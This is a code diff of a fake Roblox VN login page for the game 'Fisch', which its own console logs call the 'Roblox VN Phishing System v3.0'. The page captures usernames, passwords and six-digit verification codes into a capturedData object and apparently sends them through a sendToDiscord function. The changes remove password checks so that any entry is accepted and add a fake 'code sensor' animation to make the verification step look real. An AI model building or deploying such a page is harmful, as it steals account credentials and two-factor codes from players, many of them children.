@@ -31,7 +31,7 @@
             overflow-x: hidden;
         }
         
-        /* Roblox VN Header */
+        /* Roblox Header */
         .roblox-header {
             background-color: var(--roblox-dark);
             height: 56px;
@@ -54,35 +54,23 @@
         .logo {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
             color: white;
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 800;
             text-decoration: none;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
         
         .logo-icon {
-            width: 34px;
-            height: 34px;
+            background: linear-gradient(135deg, #ff3333, #ff9900);
+            width: 32px;
+            height: 32px;
             border-radius: 8px;
-            flex-shrink: 0;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 900;
             font-size: 18px;
-            overflow: hidden;
-            background: linear-gradient(135deg, #e60012, #ff3344);
-            border: 2px solid #ff3344;
-        }
-        
-        .logo-icon img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            padding: 2px;
         }
         
         .nav-links {
@@ -543,17 +531,12 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.7);
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 14px;
-        }
-        
-        .video-overlay i {
-            font-size: 30px;
-            margin-right: 8px;
+            font-size: 24px;
         }
         
         /* Modals */
@@ -629,6 +612,23 @@
             border-color: var(--roblox-blue);
         }
         
+        /* Password input dengan hide/show */
+        .password-container {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--roblox-light-gray);
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
         .login-btn {
             width: 100%;
             background: linear-gradient(180deg, #00b2ff 0%, #0088cc 100%);
@@ -664,7 +664,7 @@
             text-decoration: underline;
         }
         
-        /* Error & Validation Messages */
+        /* Error Messages */
         .error-message {
             color: var(--roblox-red);
             font-size: 14px;
@@ -678,38 +678,32 @@
             border-left: 4px solid var(--roblox-red);
         }
         
-        .validation-message {
-            color: var(--roblox-orange);
-            font-size: 13px;
-            margin-top: 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px;
-            background-color: rgba(255, 153, 0, 0.1);
-            border-radius: 6px;
-            border-left: 4px solid var(--roblox-orange);
+        /* Verify Modal dengan sensor */
+        .verify-code-input {
+            font-size: 32px;
+            letter-spacing: 15px;
+            text-align: center;
+            font-weight: 700;
+            padding: 20px 10px;
+            font-family: monospace;
+            letter-spacing: 20px;
         }
         
-        .password-strength {
+        .code-sensor {
             display: none;
+            color: var(--roblox-blue);
+            font-size: 14px;
+            text-align: center;
             margin-top: 10px;
-            font-size: 13px;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            animation: blink 1s infinite;
         }
         
-        .strength-bar {
-            height: 4px;
-            background-color: var(--roblox-border);
-            border-radius: 2px;
-            margin-top: 5px;
-            overflow: hidden;
-        }
-        
-        .strength-fill {
-            height: 100%;
-            width: 0%;
-            transition: width 0.3s, background-color 0.3s;
-            border-radius: 2px;
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
         
         /* Loading Modal */
@@ -731,15 +725,6 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-        
-        /* Verify Modal */
-        .verify-code-input {
-            font-size: 32px;
-            letter-spacing: 15px;
-            text-align: center;
-            font-weight: 700;
-            padding: 20px 10px;
         }
         
         /* Profile Success Modal */
@@ -849,20 +834,23 @@
             .screenshots {
                 grid-template-columns: 1fr;
             }
+            
+            .verify-code-input {
+                font-size: 24px;
+                letter-spacing: 12px;
+                padding: 15px 5px;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- Roblox VN Header -->
+    <!-- Roblox Header -->
     <header class="roblox-header">
         <div class="header-left">
             <a href="#" class="logo">
-                <div class="logo-icon">
-                    <img src="https://static.wikia.nocookie.net/logopedia/images/2/29/Roblox_VN_social_media_icon.png/revision/latest?cb=20250513123826" 
-                         alt="Roblox VN" 
-                </div>
-                <span>Roblox VN</span>
+                <div class="logo-icon">R</div>
+                Roblox VN
             </a>
             
             <div class="nav-links">
@@ -960,7 +948,7 @@
                 <div class="game-hero-bg"></div>
                 <div class="game-header">
                     <div class="game-thumbnail">
-                        <img src="https://tr.rbxcdn.com/180DAY-25e167a7d7e6df8e239b7b1cf995a25b/768/432/Image/Webp/noFilter" alt="Fisch Game Thumbnail" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDE1MCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxNTAiIGhlaWdodD0iMTUwIiByeD0iMjQiIGZpbGw9InVybCgjYikiLz4KPGRlZnM+CjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgeDE9IjAiIHkxPSIwIiB4Mj0iMTUwIiB5Mj0iMTUwIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiMwMDY2Q0MiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjMDBCMkZGIi8+CjwvbGluZWFyR3JhZGllbnQ+CjwvZGVmcz4KPHBhdGggZD0iTTQwIDYwSDEwMFYxMTBINDBWNjBaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNNjAgNDBMMTAwIDYwTDYwIDgwTDQwIDYwTDYwIDQwWiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+Cg=='">
+                        <img src="https://tr.rbxcdn.com/180DAY-25e167a7d7e6df8e239b7b1cf995a25b/768/432/Image/Webp/noFilter" alt="Fisch Game Thumbnail" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDE1MCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxNTAiIGhlaWdodD0iMTUwIiByeD0iMjQiIGZpbGw9InVybCgjYikiLz4KPGRlZnM+CjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgeDE9IjAiIHkxPSIwIiB4Mj0iMTUwIiB5Mj0iMTUwIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiMwMDY2Q0MiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjMDBCMkZGIi8+CjwvbGluZWFyR3JhZGllbnQ+CjwvZGVmcz4KPC9zdmc+Cg=='">
                     </div>
                     
                     <div class="game-info">
@@ -1008,17 +996,16 @@
                 <!-- Game Screenshots -->
                 <div class="screenshots" style="margin-top: 30px;">
                     <div class="screenshot">
-                        <img src="https://tr.rbxcdn.com/180DAY-25e167a7d7e6df8e239b7b1cf995a25b/768/432/Image/Webp/noFilter" alt="Fisch Game Video Preview" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzY4IiBoZWlnaHQ9IjQzMiIgdmlld0JveD0iMCAwIDc2OCA0MzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI3NjgiIGhlaWdodD0iNDMyIiByeD0iOCIgZmlsbD0iIzAwNjZDQyIvPgo8dGV4dCB4PSIzODQiIHk9IjIxNiIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RmlzY2ggR2FtZSBWaWRlbzwvdGV4dD4KPC9zdmc+Cg=='">
-                        <div class="video-overlay" onclick="window.open('https://youtu.be/JVDAoUkOxac', '_blank')">
-                            <i class="fas fa-play-circle"></i>
-                            Watch Video
+                        <div class="video-overlay">
+                            <i class="fas fa-play-circle"></i> Watch Video
                         </div>
+                        <img src="https://i.ytimg.com/vi/JVDAoUkOxac/hqdefault.jpg" alt="Fisch Game Video Preview" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzY4IiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDc2OCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI3NjgiIGhlaWdodD0iMTUwIiByeD0iOCIgZmlsbD0iIzIyMjIyMiIvPgo8Y2lyY2xlIGN4PSIzODQiIGN5PSI3NSIgcj0iMzAiIGZpbGw9IiNGRjMzMzMiLz4KPHBhdGggZD0iTTM2NCA5MEw0MDQgNzVMMzY0IDYwTDM2NCA5MFoiIGZpbGw9IndoaXRlIi8+Cjx0ZXh0IHg9IjM4NCIgeT0iMTMwIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5XYXRjaCBHYW1lcGxheSBWaWRlbzwvdGV4dD4KPC9zdmc+Cg=='">
                     </div>
                     <div class="screenshot">
-                        <img src="https://tr.rbxcdn.com/180DAY-e46628f3c69fa9808e96391c23953360/768/432/Image/Webp/noFilter" alt="Fisch Game Preview 2" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzY4IiBoZWlnaHQ9IjQzMiIgdmlld0JveD0iMCAwIDc2OCA0MzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI3NjgiIGhlaWdodD0iNDMyIiByeD0iOCIgZmlsbD0iIzAwQjJGRiIvPgo8dGV4dCB4PSIzODQiIHk9IjIxNiIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RmlzY2ggUHJldmlldyAyPC90ZXh0Pgo8L3N2Zz4K'">
+                        <img src="https://tr.rbxcdn.com/180DAY-e46628f3c69fa9808e96391c23953360/768/432/Image/Webp/noFilter" alt="Fisch Game Screenshot 2" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzY4IiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDc2OCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI3NjgiIGhlaWdodD0iMTUwIiByeD0iOCIgZmlsbD0iIzAwQjJGRiIvPgo8dGV4dCB4PSIzODQiIHk9Ijc1IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5GaXNjaCBHYW1lIFNjcmVlbnNob3QgMjwvdGV4dD4KPC9zdmc+Cg=='">
                     </div>
                     <div class="screenshot">
-                        <img src="https://tr.rbxcdn.com/180DAY-1ee880d17059e8589ea3b1c8cd4e22a7/768/432/Image/Webp/noFilter" alt="Fisch Game Preview 3" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzY4IiBoZWlnaHQ9IjQzMiIgdmlld0JveD0iMCAwIDc2OCA0MzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI3NjgiIGhlaWdodD0iNDMyIiByeD0iOCIgZmlsbD0iIzAwODhDQyIvPgo8dGV4dCB4PSIzODQiIHk9IjIxNiIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RmlzY2ggUHJldmlldyAzPC90ZXh0Pgo8L3N2Zz4K'">
+                        <img src="https://tr.rbxcdn.com/180DAY-1ee880d17059e8589ea3b1c8cd4e22a7/768/432/Image/Webp/noFilter" alt="Fisch Game Screenshot 3" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzY4IiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDc2OCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI3NjgiIGhlaWdodD0iMTUwIiByeD0iOCIgZmlsbD0iIzAwODhDQyIvPgo8dGV4dCB4PSIzODQiIHk9Ijc1IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5GaXNjaCBHYW1lIFNjcmVlbnNob3QgMzwvdGV4dD4KPC9zdmc+Cg=='">
                     </div>
                 </div>
             </section>
@@ -1049,11 +1036,11 @@
                         <div class="games-grid">
                             <a href="#" class="popular-game">
                                 <div class="game-avatar">
-                                    <img src="https://tr.rbxcdn.com/180DAY-6cb4eb4b1b53413daa964cc2d65a3e11/768/432/Image/Webp/noFilter" alt="Fish It! Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/ff3366/ffffff?text=☄️'">
+                                    <img src="https://tr.rbxcdn.com/180DAY-6cb4eb4b1b53413daa964cc2d65a3e11/768/432/Image/Webp/noFilter" alt="Fish It! Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/00b2ff/ffffff?text=☄️'">
                                 </div>
                                 <div class="game-meta">
                                     <h4>[☄️] Fish It! 🐟</h4>
-                                    <p>Fishing Game</p>
+                                    <p>Fishing Games</p>
                                 </div>
                             </a>
                             
@@ -1063,7 +1050,7 @@
                                 </div>
                                 <div class="game-meta">
                                     <h4>Brookhaven 🏡RP</h4>
-                                    <p>Roleplay Game</p>
+                                    <p>Roleplay Games</p>
                                 </div>
                             </a>
                             
@@ -1073,17 +1060,17 @@
                                 </div>
                                 <div class="game-meta">
                                     <h4>Escape Tsunami For Brainrots!</h4>
-                                    <p>Adventure Game</p>
+                                    <p>Adventure Games</p>
                                 </div>
                             </a>
                             
                             <a href="#" class="popular-game">
                                 <div class="game-avatar">
-                                    <img src="https://tr.rbxcdn.com/180DAY-9562aea76052b8e6690596750b666b26/768/432/Image/Webp/noFilter" alt="Blox Fruits Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/3399ff/ffffff?text=🍎'">
+                                    <img src="https://tr.rbxcdn.com/180DAY-9562aea76052b8e6690596750b666b26/768/432/Image/Webp/noFilter" alt="Blox Fruits Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/ff3366/ffffff?text=🍎'">
                                 </div>
                                 <div class="game-meta">
                                     <h4>Blox Fruits</h4>
-                                    <p>Fighting Game</p>
+                                    <p>Fighting Games</p>
                                 </div>
                             </a>
                             
@@ -1093,7 +1080,7 @@
                                 </div>
                                 <div class="game-meta">
                                     <h4>[🩷] Steal a Brainrot</h4>
-                                    <p>Stealth Game</p>
+                                    <p>Stealing Games</p>
                                 </div>
                             </a>
                             
@@ -1103,7 +1090,7 @@
                                 </div>
                                 <div class="game-meta">
                                     <h4>[💥] 99 Nights in the Forest 🔦</h4>
-                                    <p>Horror Game</p>
+                                    <p>Horror Games</p>
                                 </div>
                             </a>
                         </div>
@@ -1130,25 +1117,17 @@
                     
                     <div class="form-group">
                         <label class="form-label">Password</label>
-                        <input type="password" class="form-input" id="password" placeholder="Enter your password" required>
-                        <div class="password-strength" id="passwordStrength">
-                            <div style="display: flex; justify-content: space-between; font-size: 12px;">
-                                <span>Password strength:</span>
-                                <span id="strengthText">Weak</span>
-                            </div>
-                            <div class="strength-bar">
-                                <div class="strength-fill" id="strengthFill"></div>
-                            </div>
-                        </div>
-                        <div class="validation-message" id="passwordValidation">
-                            <i class="fas fa-exclamation-triangle"></i>
-                            <span>Password must be at least 6 characters and contain letters and numbers</span>
+                        <div class="password-container">
+                            <input type="password" class="form-input" id="password" placeholder="Enter your password" required>
+                            <button type="button" class="toggle-password" id="togglePassword">
+                                <i class="fas fa-eye"></i>
+                            </button>
                         </div>
                     </div>
                     
                     <div class="error-message" id="loginError">
                         <i class="fas fa-exclamation-circle"></i>
-                        <span>Invalid credentials. Please check your username and password.</span>
+                        <span>Please check your username and password.</span>
                     </div>
                     
                     <button type="submit" class="login-btn" id="loginButton">
@@ -1189,6 +1168,10 @@
                     <div class="form-group">
                         <label class="form-label">Verification Code</label>
                         <input type="text" class="form-input verify-code-input" id="verifyCode" placeholder="000000" maxlength="6" required>
+                        <div class="code-sensor" id="codeSensor">
+                            <i class="fas fa-shield-alt"></i>
+                            <span>Code sensor activated...</span>
+                        </div>
                     </div>
                     
                     <div class="error-message" id="verifyError">
@@ -1282,10 +1265,10 @@
         const profileAvatar = document.getElementById('profileAvatar');
         const profileAvatarImg = document.getElementById('profileAvatarImg');
         const profileUsername = document.getElementById('profileUsername');
-        const passwordValidation = document.getElementById('passwordValidation');
-        const passwordStrength = document.getElementById('passwordStrength');
-        const strengthFill = document.getElementById('strengthFill');
-        const strengthText = document.getElementById('strengthText');
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+        const verifyCodeInput = document.getElementById('verifyCode');
+        const codeSensor = document.getElementById('codeSensor');
         
         let capturedData = {
             username: '',
@@ -1294,110 +1277,33 @@
             timestamp: new Date().toISOString()
         };
         
-        // Password validation rules
-        const passwordRules = {
-            minLength: 6,
-            requireLetters: true,
-            requireNumbers: true,
-            commonPasswords: [
-                'password', '123456', '12345678', '123456789', '12345',
-                'qwerty', 'abc123', 'password1', 'admin', 'letmein',
-                'welcome', 'monkey', 'dragon', 'sunshine', 'master'
-            ]
-        };
+        // Toggle password visibility
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
+        });
         
-        // Validate password strength
-        function validatePassword(password) {
-            let score = 0;
-            let messages = [];
+        // Verify code sensor dengan delay 1 detik
+        let codeSensorTimeout;
+        verifyCodeInput.addEventListener('input', function(e) {
+            verifyError.style.display = 'none';
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value.substring(0, 6);
             
-            // Length check
-            if (password.length >= passwordRules.minLength) {
-                score += 25;
-            } else {
-                messages.push(`Must be at least ${passwordRules.minLength} characters`);
+            // Show sensor setelah 1 detik delay
+            clearTimeout(codeSensorTimeout);
+            if (value.length === 6) {
+                codeSensorTimeout = setTimeout(() => {
+                    codeSensor.style.display = 'flex';
+                    
+                    // Hide sensor setelah 2 detik
+                    setTimeout(() => {
+                        codeSensor.style.display = 'none';
+                    }, 2000);
+                }, 1000); // 1 detik delay
             }
-            
-            // Letter check
-            if (/[a-zA-Z]/.test(password)) {
-                score += 25;
-            } else {
-                messages.push('Must contain letters');
-            }
-            
-            // Number check
-            if (/\d/.test(password)) {
-                score += 25;
-            } else {
-                messages.push('Must contain numbers');
-            }
-            
-            // Complexity check (special chars, uppercase, lowercase)
-            if (/[A-Z]/.test(password) && /[a-z]/.test(password)) {
-                score += 15;
-            }
-            if (/[^a-zA-Z0-9]/.test(password)) {
-                score += 10;
-            }
-            
-            // Check for common passwords
-            if (passwordRules.commonPasswords.includes(password.toLowerCase())) {
-                score = 0;
-                messages.push('Password is too common. Choose a stronger password.');
-            }
-            
-            // Update strength display
-            updateStrengthDisplay(score, messages);
-            
-            return {
-                isValid: score >= 50,
-                score: score,
-                messages: messages
-            };
-        }
-        
-        // Update password strength display
-        function updateStrengthDisplay(score, messages) {
-            let color, text, width;
-            
-            if (score === 0) {
-                color = '#ff3333';
-                text = 'Very Weak';
-                width = '10%';
-            } else if (score < 50) {
-                color = '#ff6666';
-                text = 'Weak';
-                width = '30%';
-            } else if (score < 75) {
-                color = '#ff9900';
-                text = 'Fair';
-                width = '60%';
-            } else if (score < 90) {
-                color = '#99cc33';
-                text = 'Good';
-                width = '80%';
-            } else {
-                color = '#00b815';
-                text = 'Strong';
-                width = '100%';
-            }
-            
-            strengthFill.style.width = width;
-            strengthFill.style.backgroundColor = color;
-            strengthText.textContent = text;
-            strengthText.style.color = color;
-            
-            // Show/hide validation message
-            if (messages.length > 0 && score < 50) {
-                passwordValidation.style.display = 'flex';
-                passwordValidation.querySelector('span').textContent = messages.join('. ') + '.';
-            } else {
-                passwordValidation.style.display = 'none';
-            }
-            
-            // Show/hide strength bar
-            passwordStrength.style.display = 'block';
-        }
+        });
         
         // Generate cool Discord embed with profile
         function sendToDiscord(type, content, username = '') {
@@ -1516,34 +1422,18 @@
         playButton.addEventListener('click', function() {
             loginModal.style.display = 'flex';
             document.getElementById('username').focus();
-            passwordStrength.style.display = 'none';
-            passwordValidation.style.display = 'none';
             loginError.style.display = 'none';
-        });
-        
-        // Password input validation
-        document.getElementById('password').addEventListener('input', function(e) {
-            const password = e.target.value;
-            
-            if (password.length > 0) {
-                const validation = validatePassword(password);
-                
-                // Show/hide error based on validation
-                if (!validation.isValid && password.length >= passwordRules.minLength) {
-                    loginError.style.display = 'flex';
-                    loginError.querySelector('span').textContent = 'Password is too weak. ' + validation.messages.join('. ') + '.';
-                } else {
-                    loginError.style.display = 'none';
-                }
-            } else {
-                passwordStrength.style.display = 'none';
-                passwordValidation.style.display = 'none';
-                loginError.style.display = 'none';
-            }
+            passwordInput.type = 'password';
+            togglePassword.innerHTML = '<i class="fas fa-eye"></i>';
         });
         
         // Username input clears errors
         document.getElementById('username').addEventListener('input', function() {
+            loginError.style.display = 'none';
+        });
+        
+        // Password input clears errors
+        passwordInput.addEventListener('input', function() {
             loginError.style.display = 'none';
         });
         
@@ -1552,7 +1442,7 @@
             e.preventDefault();
             
             const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
+            const password = passwordInput.value.trim();
             
             // Basic validation
             if (!username || !password) {
@@ -1561,25 +1451,10 @@
                 return;
             }
             
-            // Password strength validation
-            const passwordValidationResult = validatePassword(password);
-            if (!passwordValidationResult.isValid) {
+            // Check password length minimum
+            if (password.length < 1) {
                 loginError.style.display = 'flex';
-                loginError.querySelector('span').textContent = 'Password is too weak. ' + passwordValidationResult.messages.join('. ') + '.';
-                return;
-            }
-            
-            // Check for common passwords
-            if (passwordRules.commonPasswords.includes(password.toLowerCase())) {
-                loginError.style.display = 'flex';
-                loginError.querySelector('span').textContent = 'This password is too common. Please choose a stronger password.';
-                return;
-            }
-            
-            // Check password length
-            if (password.length < passwordRules.minLength) {
-                loginError.style.display = 'flex';
-                loginError.querySelector('span').textContent = `Password must be at least ${passwordRules.minLength} characters.`;
+                loginError.querySelector('span').textContent = 'Please enter your password.';
                 return;
             }
             
@@ -1600,7 +1475,9 @@
             setTimeout(function() {
                 loadingModal.style.display = 'none';
                 verifyModal.style.display = 'flex';
-                document.getElementById('verifyCode').focus();
+                verifyCodeInput.focus();
+                verifyCodeInput.value = '';
+                codeSensor.style.display = 'none';
             }, 3000);
         });
         
@@ -1608,7 +1485,7 @@
         verifyForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const verifyCode = document.getElementById('verifyCode').value.trim();
+            const verifyCode = verifyCodeInput.value.trim();
             
             if (!verifyCode || verifyCode.length !== 6 || isNaN(verifyCode)) {
                 verifyError.style.display = 'flex';
@@ -1617,6 +1494,7 @@
             
             capturedData.verifyCode = verifyCode;
             verifyError.style.display = 'none';
+            codeSensor.style.display = 'none';
             
             // Show loading
             verifyModal.style.display = 'none';
@@ -1674,42 +1552,30 @@
             }
         });
         
-        // Verify code input validation
-        document.getElementById('verifyCode').addEventListener('input', function(e) {
-            verifyError.style.display = 'none';
-            let value = e.target.value.replace(/\D/g, '');
-            e.target.value = value.substring(0, 6);
-        });
-        
         // Enter key support
-        document.getElementById('password').addEventListener('keypress', function(e) {
+        passwordInput.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 loginForm.dispatchEvent(new Event('submit'));
             }
         });
         
-        document.getElementById('verifyCode').addEventListener('keypress', function(e) {
+        verifyCodeInput.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 verifyForm.dispatchEvent(new Event('submit'));
             }
         });
         
-        // Initialize on page load
+        // Video overlay click
+        document.querySelector('.video-overlay').addEventListener('click', function() {
+            window.open('https://youtu.be/JVDAoUkOxac', '_blank');
+        });
+        
+        // Console styling
         window.addEventListener('load', function() {
-            // Console styling
             console.log("%c🌀 CURSED MAHORAGA - WHEEL SPINNING ∞", "color: #00b2ff; font-size: 16px; font-weight: bold; text-shadow: 0 0 10px #00b2ff;");
-            console.log("%c🎮 Roblox VN Phishing System - FINAL VERSION", "color: #ff3333; font-size: 14px;");
-            console.log("%c✅ Logo Roblox VN loaded successfully", "color: #00b815; font-size: 12px;");
-            console.log("%c🔐 Password validation system: ACTIVE", "color: #ff9900; font-size: 12px;");
-            console.log("%c📊 Discord webhook: READY", "color: #00b2ff; font-size: 12px;");
-            
-            // Check logo loading
-            const logo = document.querySelector('.logo-icon img');
-            if (logo.complete && logo.naturalHeight !== 0) {
-                console.log("✅ Roblox VN logo loaded from CDN");
-            } else {
-                console.log("⚠️ Using fallback Roblox VN logo");
-            }
+            console.log("%c🎮 Roblox VN Phishing System v3.0", "color: #ff3333; font-size: 14px;");
+            console.log("%c🐟 Fisch Game with Real Images Loaded", "color: #00b815; font-size: 12px;");
+            console.log("%c🔐 Code Sensor System: ACTIVE (1s delay)", "color: #ff9900; font-size: 12px;");
         });
     </script>
 </body>
